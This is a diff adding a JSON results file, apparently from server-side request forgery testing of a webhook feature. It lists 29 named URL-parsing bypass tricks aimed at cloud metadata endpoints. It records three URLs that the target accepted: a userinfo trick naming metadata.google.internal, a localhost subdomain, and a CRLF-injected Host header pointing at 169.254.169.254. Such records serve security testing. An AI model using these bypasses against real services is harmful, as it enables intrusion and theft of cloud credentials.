@@ -1,0 +1,50 @@
+{
+  "bypasses_tried": [
+    "whatwg-bs-at",
+    "whatwg-bs-dot",
+    "square-localhost",
+    "protorel-bs",
+    "userinfo-evil",
+    "userinfo-mix",
+    "fragment-at",
+    "tripleslash",
+    "mix-slash",
+    "gcp-short",
+    "gcp-short-svc",
+    "gcp-aws-alias",
+    "gcp-dec",
+    "gcp-oct",
+    "gcp-hex",
+    "gcp-ipv6",
+    "gcp-ipv6-hex",
+    "gcp-zero",
+    "gcp-zero-port",
+    "gcp-localhost",
+    "localtest-me",
+    "nip-127",
+    "nip-169",
+    "nip-meta",
+    "sub-localhost",
+    "crlf",
+    "gcp-meta-port-80",
+    "space",
+    "nat64"
+  ],
+  "hits": [
+    {
+      "tag": "userinfo-mix",
+      "url": "http://metadata.google.internal@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/userinfo-test",
+      "body": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 200, \"message\": \"Webhook responded with status 200\"}}"
+    },
+    {
+      "tag": "sub-localhost",
+      "url": "http://localhost.webhook.site/",
+      "body": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 200, \"message\": \"Webhook responded with status 200\"}}"
+    },
+    {
+      "tag": "crlf",
+      "url": "https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/crlf%0d%0aHost:%20169.254.169.254",
+      "body": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 200, \"message\": \"Webhook responded with status 200\"}}"
+    }
+  ]
+}
